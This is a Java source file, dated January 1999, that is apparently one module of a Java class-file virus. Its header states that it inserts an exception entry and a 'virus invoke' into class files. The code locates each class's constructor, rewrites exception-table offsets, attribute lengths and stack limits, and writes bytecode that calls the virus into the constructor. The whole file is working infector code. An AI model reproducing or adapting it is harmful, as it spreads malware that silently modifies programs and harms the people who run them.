//=============================================================
//
// Title:  c8f67b45.java
// Author: Landing Camel International
// Date:   January 1999
//
// Notes:  This class will insert a new exception entry into
//         the class file and insert a virus invoke
//
//=============================================================

import java.util.*;
import java.io.*;

public class c8f67b45 {
	
   private byte virus_invoke[];
   private int virus_cp_count = 96;   

   //----------------------------------------------------------
   int insert(int temp_m_count, int temp_m_pointer, 
              int delta_offset, RandomAccessFile temp, 
              a98b34f2 ptr, Hashtable hash)                     
              throws IOException {

      boolean isValid = false;
      int temp_return_pointer = 0;   
      int temp_m_access_flags;
      int temp_m_name_index;
      int temp_m_attr_count;
      int temp_m_attribute_name;
      int temp_m_attribute_length = 0;
      int temp_m_code_length;
      int temp_e_table_length;
      int temp_e_start_pc;
      int temp_e_end_pc;
      int temp_e_handler_pc;    
      int temp_e_catch_type;  
      int temp_attr_count;
      int temp_attr_pointer;
      int temp_attr_length;
      int temp_deleted;
      int temp_offset;
      byte temp_tail[];

      //iterate through each method
      for (int i = 0; i < temp_m_count; i++) {

         temp_return_pointer = ptr.fpointer;

         //read temp_m_access_flags
         temp_m_access_flags = temp.readUnsignedShort();

         //read temp_m_name_index
         ptr.update(2);
         temp_m_name_index = temp.readUnsignedShort();

         //read temp_m_attr_count
         ptr.update(4);
         temp_m_attr_count = temp.readUnsignedShort();

         ptr.update(2);

         for (int j=0; (j < temp_m_attr_count) && (!isValid); j++) {

            //read temp_m_attribute_name
            temp_m_attribute_name = temp.readUnsignedShort();

            //read temp_m_attribute_length
            ptr.update(2);
            temp_m_attribute_length = temp.readInt();

            //test method for viable attributes
            if (((temp_m_access_flags & 0xFFF8) != 0) ||
                (!hash.get(new Integer(temp_m_name_index)).equals("<init>")) ||                        
	        (!hash.get(new Integer(temp_m_attribute_name)).equals("Code"))) 
	    	   ptr.update(temp_m_attribute_length + 4);    	
            else isValid = true;               
         
        }
        
        if (!isValid) continue;         

         //read temp_m_code_length
         ptr.update(8);
         temp_m_code_length = temp.readInt();

         //iterate to start of code
         ptr.update(4);

         //read temp_e_table_length
         ptr.update(temp_m_code_length);
         temp_e_table_length = temp.readUnsignedShort();

         //iterate and update exception_table
         ptr.update(2);
         for (int j = 0; j < temp_e_table_length; j++) {

            //read temp_e_start_pc
            ptr.update(2);
            temp_e_start_pc = temp.readUnsignedShort();
            ptr.seek();
            temp.writeShort(temp_e_start_pc + 8);

            //read temp_e_end_pc
            ptr.update(2);
            temp_e_end_pc = temp.readUnsignedShort();
            ptr.seek();
            temp.writeShort(temp_e_end_pc + 8);

            //read temp_e_handler_pc
            ptr.update(2);
            temp_e_handler_pc = temp.readUnsignedShort();
            ptr.seek();
            temp.writeShort(temp_e_handler_pc + 8);

            //skip temp_e_catch_type
            ptr.update(2);
            
         } // end for

         //read temp_attr_count
         temp_attr_count = temp.readUnsignedShort();
         temp_attr_pointer = ptr.fpointer;

         //iterate through attributes
         ptr.update(2);
         for (int j = 0; j < temp_attr_count; j++) {

            //read temp_attr_length
            ptr.update(2);
            temp_attr_length = temp.readInt();

            //iterate temp_attr
            ptr.update(4 + temp_attr_length);

         } // end for              
     
         temp_deleted = ptr.fpointer - temp_attr_pointer - 2;
     
         //save end of the file
         temp_offset = (int)temp.length() - ptr.fpointer;
         temp_tail = new byte[temp_offset];
         temp.read(temp_tail, 0, temp_offset);

         ptr.seek(temp_attr_pointer);

         //write necessary data
         temp.writeShort(0);
         temp.write(temp_tail);

         //seek to start of method
         ptr.seek(temp_return_pointer + 10);
         
         //update temp_m_attribute_length
         temp.writeInt(temp_m_attribute_length - temp_deleted + 8); //add 12

         //update max_stack and max_locals
         ptr.update(4);
         
         for (int j=0; j < 2; j++) { 
            int temp_max_locals_and_stack = temp.readShort();
            ptr.seek();
            temp.writeShort(temp_max_locals_and_stack + 1);
            ptr.update(2);
         }         

         //update temp_m_code_length
         temp.writeInt(temp_m_code_length + 8); //add 12

         //save end of the file
         ptr.update(8);   
         temp_offset = (int)temp.length() - ptr.fpointer;
         temp_tail = new byte[temp_offset];
         temp.read(temp_tail, 0, temp_offset);

         ptr.seek();

         //write the invoke code
	 temp.writeShort(0x2A12);
	 
	 temp.writeByte(0x02+delta_offset);
	 temp.writeByte(0xB6);	 
	 temp.writeShort(0x001A+delta_offset);
	 temp.writeShort(0);   
	 
	 ptr.update(8);  

         //write the rest of the file
         temp.write(temp_tail);

         return(temp_return_pointer);  
         
      }         
      
   return(0);
      
   }
   //----------------------------------------------------------
   
}
